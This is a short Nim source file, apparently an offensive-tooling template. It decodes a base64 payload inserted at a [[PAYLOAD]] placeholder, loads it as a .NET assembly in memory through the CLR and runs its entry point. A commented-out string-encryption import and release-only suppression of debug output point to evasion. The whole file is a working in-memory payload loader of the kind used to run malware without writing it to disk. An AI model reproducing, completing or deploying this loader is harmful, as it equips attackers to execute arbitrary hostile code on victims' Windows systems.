import std/base64
import winim/clr
import strformat

#import strenc

func toByteSeq*(str: string): seq[byte] {.inline.} =
    ## Converts a string to the corresponding byte sequence.
    @(str.toOpenArrayByte(0, str.high))

var b64 :string  = ""
[[PAYLOAD]]


var ct : string = decode(b64)
var bytes = toByteSeq(ct)

when not defined(release):
    echo bytes.len()

when not defined(release):  
    echo "[*] Installed .NET versions"
    for v in clrVersions():
        echo fmt"    \--- {v}"
    echo "\n"

    echo ""

var assembly = load(bytes)

var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
